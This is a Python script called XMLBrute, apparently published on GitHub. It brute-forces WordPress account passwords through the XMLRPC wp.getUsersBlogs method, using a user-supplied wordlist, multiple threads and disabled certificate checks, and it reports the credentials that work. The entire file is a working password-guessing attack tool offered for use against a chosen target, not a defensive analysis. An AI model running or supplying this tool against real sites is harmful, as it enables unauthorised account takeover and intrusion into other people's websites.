import requests
import urllib3
import os
import threading

os.system('cls' if os.name == 'nt' else 'clear')

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def send_auth_attempt(url, username, password):
    xml_request = '''
    <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value>{}</value></param>
            <param><value>{}</value></param>
        </params>
    </methodCall>
    '''.format(username, password)

    headers = {'Content-Type': 'text/xml'}
    data = xml_request.encode('utf-8')

    response = requests.post(url, headers=headers, data=data, verify=False)

    if "403" in response.content.decode():
        print("Authentication failed for username: {}, password: {}".format(username, password))
    elif "parse error" in response.content.decode():
        print("Authentication failed for username: {}, password: {}".format(username, password))
    elif "insufficient" in response.content.decode():
        print("Authentication failed for username: {}, password: {}".format(username, password))
    elif "404" in response.content.decode():
        print("Authentication failed for username: {}, password: {}".format(username, password))
    else:
        print("Authentication succeeded for username: {}, password: {}".format(username, password))
        os._exit(0)


def login_script():
    logo = '''

▀███▀   ▀██▀▀████▄     ▄███▀████▀   ▀███▀▀▀██▄                    ██           
  ███▄  ▄█    ████    ████   ██       ██    ██                    ██           
   ▀██▄█▀     █ ██   ▄█ ██   ██       ██    █████▄███▀███  ▀███ ██████  ▄▄█▀██ 
     ███      █  ██  █▀ ██   ██       ██▀▀▀█▄▄ ██▀ ▀▀  ██    ██   ██   ▄█▀   ██
   ▄█▀▀██▄    █  ██▄█▀  ██   ██     ▄ ██    ▀█ ██      ██    ██   ██   ██▀▀▀▀▀▀
  ▄█   ▀██▄   █  ▀██▀   ██   ██    ▄█ ██    ▄█ ██      ██    ██   ██   ██▄    ▄
▄██▄▄  ▄▄███▄███▄ ▀▀  ▄████▄█████████████████▄████▄    ▀████▀███▄ ▀████ ▀█████▀

                 XMLBrute is a simple program i made to make 
               brute forcing passwords on WordPress using XMLRPC.
                        Made by GuardianN06 on Github
'''
    print(logo)
    target_url = input("Enter the XMLRPC endpoint of the target => ")
    username = input("Enter the username for login attempts => ")
    password_file = input("Enter the wordlist file path => ")
    num_threads = int(input("Enter the number of threads to use (default: 5) => ") or 5)

    if not target_url.endswith('xmlrpc.php'):
        if not target_url.endswith('/'):
            target_url += '/'
        target_url += 'xmlrpc.php'

    def attempt_login(password):
        password = password.strip()
        send_auth_attempt(target_url, username, password)

    with open(password_file, 'r') as f:
        threads = []
        for password in f:
            password = password.strip()
            t = threading.Thread(target=attempt_login, args=(password,))
            threads.append(t)
            t.start()

            if len(threads) >= num_threads:
                for t in threads:
                    t.join()
                threads = []

        for t in threads:
            t.join()

    print("No valid authentication found for username: {}, password: {}".format(username, password))

try:
    login_script()
except KeyboardInterrupt:
    quit()
